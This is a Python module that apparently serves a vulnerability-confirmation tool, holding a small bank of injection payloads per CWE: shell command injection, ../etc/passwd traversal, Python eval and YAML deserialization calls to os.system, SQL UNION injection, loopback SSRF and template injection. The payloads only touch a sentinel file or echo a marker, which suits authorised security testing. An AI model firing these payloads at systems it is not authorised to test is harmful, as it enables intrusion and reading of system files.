"""Per-CWE source-driven payload bank (epic §3 taxonomy)."""
from __future__ import annotations
from dataclasses import dataclass
MARKER = 'VULNERABLE'
FS_SIGNATURE = 'pwned_marker'

@dataclass(frozen=True)
class Payload:
    cwe: str
    confirm_kind: str
    template: str
    response_match: str = ''
    aliases: tuple = ()
_BANK = {'CWE-78': Payload('CWE-78', 'fs_sentinel', '; touch <<FS>>; echo <<MARKER>>; #', aliases=('command_injection', 'os_command_injection', 'rce_shell')), 'CWE-22': Payload('CWE-22', 'response_marker', '../../../../../../etc/passwd', response_match='root:', aliases=('path_traversal', 'directory_traversal', 'lfi')), 'CWE-94': Payload('CWE-94', 'fs_sentinel', "__import__('os').system('touch <<FS>>')", aliases=('code_injection', 'sandbox_escape', 'rce')), 'CWE-95': Payload('CWE-95', 'fs_sentinel', "__import__('os').system('touch <<FS>>')", aliases=('eval_injection', 'eval_usage')), 'CWE-502': Payload('CWE-502', 'fs_sentinel', "!!python/object/apply:os.system ['touch <<FS>>']", aliases=('deserialization', 'insecure_deserialization', 'yaml_load')), 'CWE-89': Payload('CWE-89', 'response_marker', "' UNION SELECT '<<MARKER>>'-- ", response_match=MARKER, aliases=('sqli', 'sql_injection')), 'CWE-918': Payload('CWE-918', 'loopback', 'http://127.0.0.1:<<PORT>>/<<NONCE>>', aliases=('ssrf', 'server_side_request_forgery')), 'CWE-1336': Payload('CWE-1336', 'response_marker', '{{7*7}}', response_match='49', aliases=('ssti', 'template_injection'))}
_ALIAS = {a: cwe for cwe, p in _BANK.items() for a in p.aliases}

def supported_cwes() -> tuple:
    return tuple(_BANK.keys())

def _canonical(cwe: str) -> str:
    clean_name = (cwe or '').strip()
    if clean_name in _BANK:
        return clean_name
    low = clean_name.lower()
    if low in _ALIAS:
        return _ALIAS[low]
    raise KeyError('no payload for %r' % (cwe,))

def get_payload(cwe: str) -> Payload:
    return _BANK[_canonical(cwe)]

def render(cwe: str, *, marker: str=MARKER, fs: str=FS_SIGNATURE, nonce: str='', port: str='', cmd: str='') -> str:
    p = get_payload(cwe)
    out = p.template
    for slot, val in (('<<MARKER>>', marker), ('<<FS>>', fs), ('<<NONCE>>', nonce), ('<<PORT>>', port), ('<<CMD>>', cmd)):
        out = out.replace(slot, val)
    return out